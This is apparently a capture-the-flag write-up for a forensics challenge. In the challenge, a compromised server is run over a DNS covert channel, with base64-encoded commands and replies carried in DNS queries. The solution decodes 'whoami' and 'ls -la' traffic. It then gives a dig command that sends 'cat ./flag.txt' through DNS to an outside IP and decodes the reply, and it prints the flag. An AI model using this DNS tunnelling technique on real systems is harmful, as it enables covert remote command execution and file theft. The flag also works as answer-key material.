#### Challenge:

One of my servers was compromised, but I can't figure it out. See if you can solve it for me! [capture.pcap](./capture.pcap ":ignore")

---

#### Solution:

- inspect DNS queries
- `d2hvYW1pCg==` -> `cm9vdA==`
- `whoami` -> `root`
- `bHMgLWxhCg==` -> `dG90YWwgMjUxMgpkcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICA0MDk2IE1hciAgNiAwNDo0NCAuCmRyd3hyLXhyLXggICAgMSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgTWFyICA2IDA4OjA5IC4uCi1ydy1yLS1yLS0gICAgMSByb290ICAgICByb290ICAgICAgICAgMTIyODggTWFyICA2IDA0OjQyIC5NYWtlZmlsZS5zd3AKLXJ3LXItLXItLSAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgIDEwNCBNYXIgIDUgMjM6NTAgRG9ja2VyZmlsZQotcnctci0tci0tICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICAgMTE5IE1hciAgNSAyMzo1MCBNYWtlZmlsZQotcnctci0tci0tICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICAgIDI4IE1hciAgNSAyMzo1MCBmbGFnLnR4dAotcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAyNTMzODIzIE1hciAgNiAwNDo0NCBzZXJ2ZXIKLXJ3LXItLXItLSAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgMTY5MyBNYXIgIDUgMjM6NTAgc2VydmVyLmdv`
- `ls -la` ->
```console
total 2512
drwxr-xr-x 1 root root 4096 Mar 6 04:44 .
drwxr-xr-x 1 root root 4096 Mar 6 08:09 ..
-rw-r--r-- 1 root root 12288 Mar 6 04:42 .Makefile.swp
-rw-r--r-- 1 root root 104 Mar 5 23:50 Dockerfile
-rw-r--r-- 1 root root 119 Mar 5 23:50 Makefile
-rw-r--r-- 1 root root 28 Mar 5 23:50 flag.txt
-rwxr-xr-x 1 root root 2533823 Mar 6 04:44 server
-rw-r--r-- 1 root root 1693 Mar 5 23:50 server.go
```

- the original dns server doesn't responds so try to repeat the whole procedure

```bash
dig @35.225.16.21 dns.google.com A +short
dig @3.88.57.227 $(echo 'cat ./flag.txt' | base64) TXT IN +short | \
  tr -d '"' | \
  base64 -d
```

---

<details><summary>FLAG:</summary>

```
utflag{$al1y_s3L1S_sE4_dN$}
```

</details>
<br/>
